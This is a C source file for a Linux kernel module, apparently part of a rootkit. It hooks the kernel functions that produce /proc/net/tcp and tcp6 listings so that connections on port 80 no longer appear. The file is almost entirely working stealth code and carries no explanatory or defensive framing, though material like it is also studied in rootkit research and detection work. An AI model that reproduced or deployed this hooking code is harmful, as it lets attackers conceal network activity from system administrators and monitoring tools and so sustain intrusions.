#include <linux/module.h>
#include <linux/tcp.h>
#include "hiding_ports.h"
#define PORT 80

long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	long ret;
	unsigned short port = htons(PORT);

	if (v != ((void *)1)) {
		if (port == ((struct inet_sock *)v)->inet_sport)
			return 0;
	}
	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

long hook_tcp6_seq_show(struct seq_file *seq, void *v)
{
	long ret;
	unsigned short port = htons(PORT);

	if (v != ((void *)1)) {
		if (port == ((struct inet_sock *)v)->inet_sport)
			return 0;
	}
	ret = orig_tcp6_seq_show(seq, v);
	return ret;
}
